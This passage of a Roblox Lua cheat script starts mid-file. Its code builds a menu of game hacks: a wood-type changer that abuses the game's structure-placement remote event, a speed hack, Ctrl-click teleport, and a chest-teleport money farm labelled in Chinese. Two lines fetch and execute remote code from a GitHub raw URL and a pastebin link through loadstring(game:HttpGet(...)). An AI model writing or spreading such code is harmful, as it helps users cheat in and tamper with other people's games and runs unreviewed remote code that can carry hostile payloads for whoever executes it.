	DropShadow.Size = UDim2.new(1, 0, 1, 0)
	DropShadow.ZIndex = 2
	
	Grey.Name = "Grey"
	Grey.Parent = Picker
	Grey.BackgroundColor3 = Color3.new(1, 1, 1)
	Grey.BorderColor3 = Color3.new(0, 0, 0)
	Grey.Position = UDim2.new(0, 10, 0, 55)
	Grey.Size = UDim2.new(0, 80, 0, 40)
	Grey.ZIndex = 3
	Grey.Image = "rbxassetid://924320031"
	Grey.ScaleType = Enum.ScaleType.Crop
	
	DropShadow_2.Name = "DropShadow"
	DropShadow_2.Parent = Grey
	DropShadow_2.BackgroundColor3 = Color3.new(0, 0, 0)
	DropShadow_2.BorderSizePixel = 0
	DropShadow_2.Position = UDim2.new(0, 4, 0, 4)
	DropShadow_2.Size = UDim2.new(1, 0, 1, 0)
	DropShadow_2.ZIndex = 2
	
	Walnut.Name = "Walnut"
	Walnut.Parent = Picker
	Walnut.BackgroundColor3 = Color3.new(1, 1, 1)
	Walnut.BorderColor3 = Color3.new(0, 0, 0)
	Walnut.Position = UDim2.new(0, 10, 0, 105)
	Walnut.Size = UDim2.new(0, 80, 0, 40)
	Walnut.ZIndex = 3
	Walnut.Image = "rbxassetid://2712559790"
	Walnut.ScaleType = Enum.ScaleType.Crop
	
	DropShadow_3.Name = "DropShadow"
	DropShadow_3.Parent = Walnut
	DropShadow_3.BackgroundColor3 = Color3.new(0, 0, 0)
	DropShadow_3.BorderSizePixel = 0
	DropShadow_3.Position = UDim2.new(0, 4, 0, 4)
	DropShadow_3.Size = UDim2.new(1, 0, 1, 0)
	DropShadow_3.ZIndex = 2
	
	Generic.Name = "Generic"
	Generic.Parent = Picker
	Generic.BackgroundColor3 = Color3.new(1, 1, 1)
	Generic.BorderColor3 = Color3.new(0, 0, 0)
	Generic.Position = UDim2.new(0, 10, 0, 155)
	Generic.Size = UDim2.new(0, 80, 0, 40)
	Generic.ZIndex = 3
	Generic.Image = "rbxassetid://2712568624"
	Generic.ScaleType = Enum.ScaleType.Crop
	
	DropShadow_4.Name = "DropShadow"
	DropShadow_4.Parent = Generic
	DropShadow_4.BackgroundColor3 = Color3.new(0, 0, 0)
	DropShadow_4.BorderSizePixel = 0
	DropShadow_4.Position = UDim2.new(0, 4, 0, 4)
	DropShadow_4.Size = UDim2.new(1, 0, 1, 0)
	DropShadow_4.ZIndex = 2
	
	Oak.Name = "Oak"
	Oak.Parent = Picker
	Oak.BackgroundColor3 = Color3.new(1, 1, 1)
	Oak.BorderColor3 = Color3.new(0, 0, 0)
	Oak.Position = UDim2.new(0, 10, 0, 205)
	Oak.Size = UDim2.new(0, 80, 0, 40)
	Oak.ZIndex = 3
	Oak.Image = "rbxassetid://2712579185"
	Oak.ScaleType = Enum.ScaleType.Crop
	
	DropShadow_5.Name = "DropShadow"
	DropShadow_5.Parent = Oak
	DropShadow_5.BackgroundColor3 = Color3.new(0, 0, 0)
	DropShadow_5.BorderSizePixel = 0
	DropShadow_5.Position = UDim2.new(0, 4, 0, 4)
	DropShadow_5.Size = UDim2.new(1, 0, 1, 0)
	DropShadow_5.ZIndex = 2
	
	Pine.Name = "Pine"
	Pine.Parent = Picker
	Pine.BackgroundColor3 = Color3.new(1, 1, 1)
	Pine.BorderColor3 = Color3.new(0, 0, 0)
	Pine.Position = UDim2.new(0, 10, 0, 255)
	Pine.Size = UDim2.new(0, 80, 0, 40)
	Pine.ZIndex = 3
	Pine.Image = "rbxassetid://2712591183"
	Pine.ScaleType = Enum.ScaleType.Crop
	
	DropShadow_6.Name = "DropShadow"
	DropShadow_6.Parent = Pine
	DropShadow_6.BackgroundColor3 = Color3.new(0, 0, 0)
	DropShadow_6.BorderSizePixel = 0
	DropShadow_6.Position = UDim2.new(0, 4, 0, 4)
	DropShadow_6.Size = UDim2.new(1, 0, 1, 0)
	DropShadow_6.ZIndex = 2
	
	Palm.Name = "Palm"
	Palm.Parent = Picker
	Palm.BackgroundColor3 = Color3.new(1, 1, 1)
	Palm.BorderColor3 = Color3.new(0, 0, 0)
	Palm.Position = UDim2.new(0, 10, 0, 305)
	Palm.Size = UDim2.new(0, 80, 0, 40)
	Palm.ZIndex = 3
	Palm.Image = "rbxassetid://2712597395"
	Palm.ScaleType = Enum.ScaleType.Crop
	
	DropShadow_7.Name = "DropShadow"
	DropShadow_7.Parent = Palm
	DropShadow_7.BackgroundColor3 = Color3.new(0, 0, 0)
	DropShadow_7.BorderSizePixel = 0
	DropShadow_7.Position = UDim2.new(0, 4, 0, 4)
	DropShadow_7.Size = UDim2.new(1, 0, 1, 0)
	DropShadow_7.ZIndex = 2
	
	Cherry.Name = "Cherry"
	Cherry.Parent = Picker
	Cherry.BackgroundColor3 = Color3.new(1, 1, 1)
	Cherry.BorderColor3 = Color3.new(0, 0, 0)
	Cherry.Position = UDim2.new(0, 10, 0, 355)
	Cherry.Size = UDim2.new(0, 80, 0, 40)
	Cherry.ZIndex = 3
	Cherry.Image = "rbxassetid://2712608599"
	Cherry.ScaleType = Enum.ScaleType.Crop
	
	DropShadow_8.Name = "DropShadow"
	DropShadow_8.Parent = Cherry
	DropShadow_8.BackgroundColor3 = Color3.new(0, 0, 0)
	DropShadow_8.BorderSizePixel = 0
	DropShadow_8.Position = UDim2.new(0, 4, 0, 4)
	DropShadow_8.Size = UDim2.new(1, 0, 1, 0)
	DropShadow_8.ZIndex = 2
	
	Koa.Name = "Koa"
	Koa.Parent = Picker
	Koa.BackgroundColor3 = Color3.new(1, 1, 1)
	Koa.BorderColor3 = Color3.new(0, 0, 0)
	Koa.Position = UDim2.new(0, 10, 0, 355)
	Koa.Size = UDim2.new(0, 80, 0, 40)
	Koa.ZIndex = 3
	Koa.Image = "rbxassetid://2712612798"
	Koa.ScaleType = Enum.ScaleType.Crop
	
	DropShadow_9.Name = "DropShadow"
	DropShadow_9.Parent = Koa
	DropShadow_9.BackgroundColor3 = Color3.new(0, 0, 0)
	DropShadow_9.BorderSizePixel = 0
	DropShadow_9.Position = UDim2.new(0, 4, 0, 4)
	DropShadow_9.Size = UDim2.new(1, 0, 1, 0)
	DropShadow_9.ZIndex = 2
	
	Volcano.Name = "Volcano"
	Volcano.Parent = Picker
	Volcano.BackgroundColor3 = Color3.new(1, 1, 1)
	Volcano.BorderColor3 = Color3.new(0, 0, 0)
	Volcano.Position = UDim2.new(0, 10, 0, 405)
	Volcano.Size = UDim2.new(0, 80, 0, 40)
	Volcano.ZIndex = 3
	Volcano.Image = "rbxassetid://2712618609"
	Volcano.ScaleType = Enum.ScaleType.Crop
	
	DropShadow_10.Name = "DropShadow"
	DropShadow_10.Parent = Volcano
	DropShadow_10.BackgroundColor3 = Color3.new(0, 0, 0)
	DropShadow_10.BorderSizePixel = 0
	DropShadow_10.Position = UDim2.new(0, 4, 0, 4)
	DropShadow_10.Size = UDim2.new(1, 0, 1, 0)
	DropShadow_10.ZIndex = 2
	
	GreenSwampy.Name = "GreenSwampy"
	GreenSwampy.Parent = Picker
	GreenSwampy.BackgroundColor3 = Color3.new(1, 1, 1)
	GreenSwampy.BorderColor3 = Color3.new(0, 0, 0)
	GreenSwampy.Position = UDim2.new(0, 10, 0, 455)
	GreenSwampy.Size = UDim2.new(0, 80, 0, 40)
	GreenSwampy.ZIndex = 3
	GreenSwampy.Image = "rbxassetid://2712623896"
	GreenSwampy.ScaleType = Enum.ScaleType.Crop
	
	DropShadow_11.Name = "DropShadow"
	DropShadow_11.Parent = GreenSwampy
	DropShadow_11.BackgroundColor3 = Color3.new(0, 0, 0)
	DropShadow_11.BorderSizePixel = 0
	DropShadow_11.Position = UDim2.new(0, 4, 0, 4)
	DropShadow_11.Size = UDim2.new(1, 0, 1, 0)
	DropShadow_11.ZIndex = 2
	
	GoldSwampy.Name = "GoldSwampy"
	GoldSwampy.Parent = Picker
	GoldSwampy.BackgroundColor3 = Color3.new(1, 1, 1)
	GoldSwampy.BorderColor3 = Color3.new(0, 0, 0)
	GoldSwampy.Position = UDim2.new(0, 10, 0, 505)
	GoldSwampy.Size = UDim2.new(0, 80, 0, 40)
	GoldSwampy.ZIndex = 3
	GoldSwampy.Image = "rbxassetid://2712631457"
	GoldSwampy.ScaleType = Enum.ScaleType.Crop
	
	DropShadow_12.Name = "DropShadow"
	DropShadow_12.Parent = GoldSwampy
	DropShadow_12.BackgroundColor3 = Color3.new(0, 0, 0)
	DropShadow_12.BorderSizePixel = 0
	DropShadow_12.Position = UDim2.new(0, 4, 0, 4)
	DropShadow_12.Size = UDim2.new(1, 0, 1, 0)
	DropShadow_12.ZIndex = 2
	
	GenericSpecial.Name = "GenericSpecial"
	GenericSpecial.Parent = Picker
	GenericSpecial.BackgroundColor3 = Color3.new(1, 1, 1)
	GenericSpecial.BorderColor3 = Color3.new(0, 0, 0)
	GenericSpecial.Position = UDim2.new(0, 10, 0, 555)
	GenericSpecial.Size = UDim2.new(0, 80, 0, 40)
	GenericSpecial.ZIndex = 3
	GenericSpecial.Image = "rbxassetid://2712639396"
	GenericSpecial.ScaleType = Enum.ScaleType.Crop
	
	DropShadow_13.Name = "DropShadow"
	DropShadow_13.Parent = GenericSpecial
	DropShadow_13.BackgroundColor3 = Color3.new(0, 0, 0)
	DropShadow_13.BorderSizePixel = 0
	DropShadow_13.Position = UDim2.new(0, 4, 0, 4)
	DropShadow_13.Size = UDim2.new(1, 0, 1, 0)
	DropShadow_13.ZIndex = 2
	
	SnowGlow.Name = "SnowGlow"
	SnowGlow.Parent = Picker
	SnowGlow.BackgroundColor3 = Color3.new(1, 1, 1)
	SnowGlow.BorderColor3 = Color3.new(0, 0, 0)
	SnowGlow.Position = UDim2.new(0, 10, 0, 605)
	SnowGlow.Size = UDim2.new(0, 80, 0, 40)
	SnowGlow.ZIndex = 3
	SnowGlow.Image = "rbxassetid://2712651454"
	SnowGlow.ScaleType = Enum.ScaleType.Crop
	
	DropShadow_14.Name = "DropShadow"
	DropShadow_14.Parent = SnowGlow
	DropShadow_14.BackgroundColor3 = Color3.new(0, 0, 0)
	DropShadow_14.BorderSizePixel = 0
	DropShadow_14.Position = UDim2.new(0, 4, 0, 4)
	DropShadow_14.Size = UDim2.new(1, 0, 1, 0)
	DropShadow_14.ZIndex = 2
	
	Frost.Name = "Frost"
	Frost.Parent = Picker
	Frost.BackgroundColor3 = Color3.new(1, 1, 1)
	Frost.BorderColor3 = Color3.new(0, 0, 0)
	Frost.Position = UDim2.new(0, 10, 0, 655)
	Frost.Size = UDim2.new(0, 80, 0, 40)
	Frost.ZIndex = 3
	Frost.Image = "rbxassetid://2712667804"
	Frost.ScaleType = Enum.ScaleType.Crop
	
	DropShadow_15.Name = "DropShadow"
	DropShadow_15.Parent = Frost
	DropShadow_15.BackgroundColor3 = Color3.new(0, 0, 0)
	DropShadow_15.BorderSizePixel = 0
	DropShadow_15.Position = UDim2.new(0, 4, 0, 4)
	DropShadow_15.Size = UDim2.new(1, 0, 1, 0)
	DropShadow_15.ZIndex = 2
	
	CaveCrawler.Name = "CaveCrawler"
	CaveCrawler.Parent = Picker
	CaveCrawler.BackgroundColor3 = Color3.new(1, 1, 1)
	CaveCrawler.BorderColor3 = Color3.new(0, 0, 0)
	CaveCrawler.Position = UDim2.new(0, 10, 0, 705)
	CaveCrawler.Size = UDim2.new(0, 80, 0, 40)
	CaveCrawler.ZIndex = 3
	CaveCrawler.Image = "rbxassetid://2712673980"
	CaveCrawler.ScaleType = Enum.ScaleType.Crop
	
	DropShadow_16.Name = "DropShadow"
	DropShadow_16.Parent = CaveCrawler
	DropShadow_16.BackgroundColor3 = Color3.new(0, 0, 0)
	DropShadow_16.BorderSizePixel = 0
	DropShadow_16.Position = UDim2.new(0, 4, 0, 4)
	DropShadow_16.Size = UDim2.new(1, 0, 1, 0)
	DropShadow_16.ZIndex = 2
	
	LoneCave.Name = "LoneCave"
	LoneCave.Parent = Picker
	LoneCave.BackgroundColor3 = Color3.new(1, 1, 1)
	LoneCave.BorderColor3 = Color3.new(0, 0, 0)
	LoneCave.Position = UDim2.new(0, 10, 0, 755)
	LoneCave.Size = UDim2.new(0, 80, 0, 40)
	LoneCave.ZIndex = 3
	LoneCave.Image = "rbxassetid://2712693147"
	LoneCave.ScaleType = Enum.ScaleType.Crop
	
	DropShadow_17.Name = "DropShadow"
	DropShadow_17.Parent = LoneCave
	DropShadow_17.BackgroundColor3 = Color3.new(0, 0, 0)
	DropShadow_17.BorderSizePixel = 0
	DropShadow_17.Position = UDim2.new(0, 4, 0, 4)
	DropShadow_17.Size = UDim2.new(1, 0, 1, 0)
	DropShadow_17.ZIndex = 2
	
	Spooky.Name = "Spooky"
	Spooky.Parent = Picker
	Spooky.BackgroundColor3 = Color3.new(1, 1, 1)
	Spooky.BorderColor3 = Color3.new(0, 0, 0)
	Spooky.Position = UDim2.new(0, 10, 0, 805)
	Spooky.Size = UDim2.new(0, 80, 0, 40)
	Spooky.ZIndex = 3
	Spooky.Image = "rbxassetid://2712696822"
	Spooky.ScaleType = Enum.ScaleType.Crop
	
	DropShadow_18.Name = "DropShadow"
	DropShadow_18.Parent = Spooky
	DropShadow_18.BackgroundColor3 = Color3.new(0, 0, 0)
	DropShadow_18.BorderSizePixel = 0
	DropShadow_18.Position = UDim2.new(0, 4, 0, 4)
	DropShadow_18.Size = UDim2.new(1, 0, 1, 0)
	DropShadow_18.ZIndex = 2
	
	SpookyNeon.Name = "SpookyNeon"
	SpookyNeon.Parent = Picker
	SpookyNeon.BackgroundColor3 = Color3.new(1, 1, 1)
	SpookyNeon.BorderColor3 = Color3.new(0, 0, 0)
	SpookyNeon.Position = UDim2.new(0, 10, 0, 855)
	SpookyNeon.Size = UDim2.new(0, 80, 0, 40)
	SpookyNeon.ZIndex = 3
	SpookyNeon.Image = "rbxassetid://2712700047"
	SpookyNeon.ScaleType = Enum.ScaleType.Crop
	
	DropShadow_19.Name = "DropShadow"
	DropShadow_19.Parent = SpookyNeon
	DropShadow_19.BackgroundColor3 = Color3.new(0, 0, 0)
	DropShadow_19.BorderSizePixel = 0
	DropShadow_19.Position = UDim2.new(0, 4, 0, 4)
	DropShadow_19.Size = UDim2.new(1, 0, 1, 0)
	DropShadow_19.ZIndex = 2
	-- Scripts:
	woodtype = "Birch"
	
	local tool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
	tool.RequiresHandle = false
	--tool.RobloxLocked = true
	tool.Name = "Paint"
	tool.ToolTip = "Changes A Stucture's Wood Type"
	tool.Equipped:connect(function(Mouse)
	ColorPicker.Enabled = true
	Mouse.Button1Down:connect(function()
	if Mouse.Target.Parent:FindFirstChild("Type") or Mouse.Target.Parent:FindFirstChild("BlueprintWoodClass") then
	local Cframe
	if Mouse.Target.Parent:FindFirstChild("MainCFrame") then
	Cframe = Mouse.Target.Parent.MainCFrame.Value
	else
	Cframe = Mouse.Target.Parent.PrimaryPart.CFrame
	end
	if Mouse.Target.Parent ~= nil then
	game.ReplicatedStorage.PlaceStructure.ClientPlacedStructure:FireServer(Mouse.Target.Parent.ItemName.Value, Cframe, game.Players.LocalPlayer, woodtype, Mouse.Target.Parent, false)
	end
	else
	--do nothing
	end
	end)
	end)
	
	tool.Unequipped:connect(function(mouse)
	ColorPicker.Enabled = false
	end)
	
	
	Birch.MouseButton1Click:Connect(function()
	CurrentColor.Image = Birch.Image
	woodtype = "Birch"
	end)
	
	Grey.MouseButton1Click:Connect(function()
	CurrentColor.Image = Grey.Image
	woodtype = nil
	end)
	
	Walnut.MouseButton1Click:Connect(function()
	CurrentColor.Image = Walnut.Image
	woodtype = "Walnut"
	end)
	
	Generic.MouseButton1Click:Connect(function()
	CurrentColor.Image = Generic.Image
	woodtype = "Generic"
	end)
	
	Oak.MouseButton1Click:Connect(function()
	CurrentColor.Image = Oak.Image
	woodtype = "Oak"
	end)
	
	Pine.MouseButton1Click:Connect(function()
	CurrentColor.Image = Pine.Image
	woodtype = "Pine"
	end)
	
	Palm.MouseButton1Click:Connect(function()
	CurrentColor.Image = Palm.Image
	woodtype = "Palm"
	end)
	
	Koa.MouseButton1Click:Connect(function()
	CurrentColor.Image = Koa.Image
	woodtype = "Koa"
	end)
	
	Volcano.MouseButton1Click:Connect(function()
	CurrentColor.Image = Volcano.Image
	woodtype = "Volcano"
	end)
	
	GreenSwampy.MouseButton1Click:Connect(function()
	CurrentColor.Image = GreenSwampy.Image
	woodtype = "GreenSwampy"
	end)
	
	GoldSwampy.MouseButton1Click:Connect(function()
	CurrentColor.Image = GoldSwampy.Image
	woodtype = "GoldSwampy"
	end)
	
	GenericSpecial.MouseButton1Click:Connect(function()
	CurrentColor.Image = GenericSpecial.Image
	woodtype = "GenericSpecial"
	end)
	
	SnowGlow.MouseButton1Click:Connect(function()
	CurrentColor.Image = SnowGlow.Image
	woodtype = "SnowGlow"
	end)
	
	Frost.MouseButton1Click:Connect(function()
	CurrentColor.Image = Frost.Image
	woodtype = "Frost"
	end)
	
	CaveCrawler.MouseButton1Click:Connect(function()
	CurrentColor.Image = CaveCrawler.Image
	woodtype = "CaveCrawler"
	end)
	
	LoneCave.MouseButton1Click:Connect(function()
	CurrentColor.Image = LoneCave.Image
	woodtype = "LoneCave"
	end)
	
	Spooky.MouseButton1Click:Connect(function()
	CurrentColor.Image = Spooky.Image
	woodtype = "Spooky"
	end)
	
	SpookyNeon.MouseButton1Click:Connect(function()
	CurrentColor.Image = SpookyNeon.Image
	woodtype = "SpookyNeon"
	end)
	
	--bring up menu
	CurrentColor.MouseButton1Click:Connect(function()
	if Picker.Visible == false then
	Picker.Visible = true
	else
	Picker.Visible = false
	end
	end)
	end)
end
coroutine.wrap(CAVE_fake_script)()
local function ASAEWG_fake_script() -- SpeedHack.Script 
	local script = Instance.new('Script', SpeedHack)

	SpeedHack.MouseButton1Down:connect(function() 
		
	local walkspeedplayer = game:GetService("Players").LocalPlayer
		local walkspeedmouse = walkspeedplayer:GetMouse()
		
		local walkspeedenabled = false
		
		function x_walkspeed(key)
			if (key == "x") then
				if walkspeedenabled == false then
					_G.WS = 200;
					local Humanoid = game:GetService("Players").LocalPlayer.Character.Humanoid;
					Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
					Humanoid.WalkSpeed = _G.WS;
					end)
					Humanoid.WalkSpeed = _G.WS;
					
					walkspeedenabled = true
				elseif walkspeedenabled == true then
					_G.WS = 20;
					local Humanoid = game:GetService("Players").LocalPlayer.Character.Humanoid;
					Humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
					Humanoid.WalkSpeed = _G.WS;
					end)
					Humanoid.WalkSpeed = _G.WS;
					
					walkspeedenabled = false
				end
			end
		end
		
		walkspeedmouse.KeyDown:connect(x_walkspeed)
		
	end)
end
coroutine.wrap(ASAEWG_fake_script)()
local function OGEB_fake_script() -- Credits.LocalScript 
	local script = Instance.new('LocalScript', Credits)

	while true do
	 script.Parent.TextColor3 = Color3.new (255, 176, 0)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (0, 255, 0)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (255, 0, 0)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (170, 85, 0)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (106, 57, 9)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (0, 16, 176)
	 wait(.1)
	script.Parent.TextColor3 = Color3.new (255, 176, 0)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (0, 255, 0)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (255, 0, 0)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (170, 85, 0)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (106, 57, 9)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (0, 16, 176)
	 wait(.1)script.Parent.TextColor3 = Color3.new (255, 176, 0)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (0, 255, 0)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (255, 0, 0)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (170, 85, 0)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (106, 57, 9)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (0, 16, 176)
	 wait(.1)script.Parent.TextColor3 = Color3.new (255, 176, 0)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (0, 255, 0)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (255, 0, 0)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (170, 85, 0)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (106, 57, 9)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (0, 16, 176)
	 wait(.1)
	end
end
coroutine.wrap(OGEB_fake_script)()
local function CMDI_fake_script() -- V125.LocalScript 
	local script = Instance.new('LocalScript', V125)

	while true do
	 script.Parent.TextColor3 = Color3.new (255, 176, 0)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (0, 255, 0)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (255, 0, 0)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (170, 85, 0)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (106, 57, 9)
	 wait(.1)
	 script.Parent.TextColor3 = Color3.new (0, 16, 176)
	 wait(.1)
	end
end
coroutine.wrap(CMDI_fake_script)()
local function PKUPIX_fake_script() -- CT.Script 
	local script = Instance.new('Script', CT)

	CT.MouseButton1Down:connect(function()
	local UIS = game:GetService("UserInputService")
	
	local Player = game.Players.LocalPlayer
	local Mouse = Player:GetMouse()
	
	
	function GetCharacter()
	   return game.Players.LocalPlayer.Character
	end
	
	function Teleport(pos)
	   local Char = GetCharacter()
	   if Char then
	       Char:MoveTo(pos)
	   end
	end
	
	
	UIS.InputBegan:Connect(function(input)
	   if input.UserInputType == Enum.UserInputType.MouseButton1 and UIS:IsKeyDown(Enum.KeyCode.LeftControl) then
	       Teleport(Mouse.Hit.p)
	   end
	end)
	end)
end
coroutine.wrap(PKUPIX_fake_script)()
end)
local creds = window:Tab("BF",'6035145364')

local tool = creds:section("功能",true)
tool:Button("刷钱（会假被踢重进就行）",function()
        local ScreenGui = Instance.new("ScreenGui")

local Frame = Instance.new("Frame")

local Frame_2 = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextButton_3 = Instance.new("TextButton")
local TextLabel = Instance.new("TextLabel")
local Players = game.Players
local Player = Players.LocalPlayer




ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.new(0.0941176, 0.309804, 0.713726)
Frame.BorderColor3 = Color3.new(0.0941176, 0.309804, 0.713726)
Frame.Position = UDim2.new(0.00891530514, 0, 0.0973053873, 0)
Frame.Size = UDim2.new(0, 175, 0, 9)

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Frame_2.BorderColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Frame_2.Position = UDim2.new(-0.0025132671, 0, 0.999667346, 0)
Frame_2.Size = UDim2.new(0, 175, 0, 164)

TextButton.Parent = Frame_2
TextButton.BackgroundColor3 = Color3.new(0.0941176, 0.309804, 0.713726)
TextButton.BorderColor3 = Color3.new(0.0941176, 0.309804, 0.713726)
TextButton.Position = UDim2.new(0.0482275374, 0, 0.0366036035, 0)
TextButton.Size = UDim2.new(0, 159, 0, 46)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "常见的"
TextButton.TextColor3 = Color3.new(0, 0, 0)
TextButton.TextSize = 14
TextButton.MouseButton1Click:Connect(function()

for i,v in pairs(game:GetDescendants()) do
if v.Name == "TouchInterest"  and v.Parent.Name == "Chest1" then
Player.Character.HumanoidRootPart.CFrame = v.Parent.CFrame
wait(0.9)
end
end

end)

TextButton_2.Parent = Frame_2
TextButton_2.BackgroundColor3 = Color3.new(0.0941176, 0.309804, 0.713726)
TextButton_2.BorderColor3 = Color3.new(0.0941176, 0.309804, 0.713726)
TextButton_2.Position = UDim2.new(0.0482275374, 0, 0.353676766, 0)
TextButton_2.Size = UDim2.new(0, 159, 0, 46)
TextButton_2.Font = Enum.Font.SourceSans
TextButton_2.Text = "不常见的"
TextButton_2.TextColor3 = Color3.new(0, 0, 0)
TextButton_2.TextSize = 14
TextButton_2.MouseButton1Click:Connect(function()

for i,v in pairs(game:GetDescendants()) do
if v.Name == "TouchInterest"  and v.Parent.Name == "Chest2" then
Player.Character.HumanoidRootPart.CFrame = v.Parent.CFrame
wait(0.9)
end
end


end)

TextButton_3.Parent = Frame_2
TextButton_3.BackgroundColor3 = Color3.new(0.0941176, 0.309804, 0.713726)
TextButton_3.BorderColor3 = Color3.new(0.0941176, 0.309804, 0.713726)
TextButton_3.Position = UDim2.new(0.0482275374, 0, 0.676847458, 0)
TextButton_3.Size = UDim2.new(0, 159, 0, 46)
TextButton_3.Font = Enum.Font.SourceSans
TextButton_3.Text = "稀有的"
TextButton_3.TextColor3 = Color3.new(0, 0, 0)
TextButton_3.TextSize = 14
TextButton_3.MouseButton1Click:Connect(function()

for i,v in pairs(game:GetDescendants()) do
if v.Name == "TouchInterest"  and v.Parent.Name == "Chest3" then
Player.Character.HumanoidRootPart.CFrame = v.Parent.CFrame
wait(0.9)
end
end


end)

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.BorderColor3 = Color3.new(0.207843, 0.207843, 0.207843)
TextLabel.Position = UDim2.new(-0.299656123, 0, 19.1475391, 0)
TextLabel.Size = UDim2.new(0, 175, 0, 27)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "繁星"
TextLabel.TextColor3 = Color3.new(0, 0, 0)
TextLabel.TextSize = 14
end)
tool:Button("多种快捷",function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/Xiao-Yun-UWU/main/%E6%B5%B7%E8%B4%BC%E7%8E%8Bbf.lua", true))()
end)

local creds = window:Tab("CUA伐木",'6035145364')

loadstring(game:HttpGet('https://pastebin.com/raw/rfceiYD6'))()




   end
end)
